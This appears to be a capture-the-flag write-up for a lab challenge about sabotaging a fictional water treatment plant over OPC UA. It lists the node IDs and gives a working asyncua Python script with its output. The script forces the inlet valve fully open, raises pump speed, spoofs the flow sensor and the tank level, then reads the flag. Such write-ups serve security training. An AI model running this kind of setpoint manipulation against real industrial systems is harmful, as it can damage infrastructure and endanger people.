Task Force Phoenix has found a flaw in Volnaya’s water treatment plant, its 2:WaterTreatmentPlant object humming via OPC UA, supplying the government’s command center. Sabotage it to flood the complex and disrupt Operation Blackout:  
- Set inlet valve to 100% open,  
- Increase pump speed to 1600 RPM,  
- Spoof flow sensor to 4 L/s,  
- Raise tank water level to 5m

# Solve

First I had to download [opcua-client](https://github.com/FreeOpcUa/opcua-client-gui) and then i tested it by connecting to my instance.

![](Images/Pasted%20image%2020250526143923.png)

We get a bunch of objects. We have to modify for the CTF Challenge

- Set inlet valve to 100% open,  
- Increase pump speed to 1600 RPM,  
- Spoof flow sensor to 4 L/s,  
- Raise tank water level to 5m

So lets try and find the respective objects.


So we found the Inlet valve is set to 75% open at the current moment.

![](Images/Pasted%20image%2020250526144042.png)

The pump speed value is at 1200 RPM

![](Images/Pasted%20image%2020250526144120.png)

The flow rate sensor is showing a dynamic value

![](Images/Pasted%20image%2020250526144153.png)

Then the water tank level is also dynamic as it seems

![](Images/Pasted%20image%2020250526144226.png)

```
ns=2;i=10  # Inlet valve
ns=2;i=6  # Tank Level
ns=2;i=13    # Flow Sensor
ns=2;i=4 # Pump speed
```

We have read write
```
CurrentRead, CurrentWrite
```

I couldn't manually edit quick enough. So I learned how to script the changes from other CTFs.

After setting it I wasn't getting a flag and then I found the SecretLog under maintanence and assumed it would add the flag as a value there once all other values were set.

```
from asyncua import Client
import asyncio

async def set_and_read_secretlog():
    try:
        async with Client(url="opc.tcp://83.136.255.230:49384") as client:
            await client.connect()
            # Set values
            nodes = [
                ("ns=2;i=10", 100.0, "Inlet valve"),  # Inlet valve
                ("ns=2;i=6", 5.0, "Tank level"),      # Tank level
                ("ns=2;i=13", 4.0, "Flow sensor"),    # Flow sensor
                ("ns=2;i=4", 1600.0, "Pump speed")    # Pump speed
            ]
            for node_id, value, name in nodes:
                node = client.get_node(node_id)
                await node.write_value(value)
                print(f"Set {name} ({node_id}) to {value}")

            # Verify values
            for node_id, value, name in nodes:
                node = client.get_node(node_id)
                current_value = await node.read_value()
                print(f"Verified {name} ({node_id}): {current_value}")

            # Read SecretLog node
            secretlog_node = client.get_node("ns=2;i=15")
            secretlog_value = await secretlog_node.read_value()
            print(f"SecretLog (ns=2;i=15): {secretlog_value}")

    except Exception as e:
        print(f"Error: {e}")

asyncio.run(set_and_read_secretlog())
```

Output

```
Set Inlet valve (ns=2;i=10) to 100.0
Set Tank level (ns=2;i=6) to 5.0
Set Flow sensor (ns=2;i=13) to 4.0
Set Pump speed (ns=2;i=4) to 1600.0
Verified Inlet valve (ns=2;i=10): 100.0
Verified Tank level (ns=2;i=6): 5.0
Verified Flow sensor (ns=2;i=13): 4.0
Verified Pump speed (ns=2;i=4): 1600.0
SecretLog (ns=2;i=15): HTB{w4t3r_tr34tm3nt_0v3rfl0w3d}
```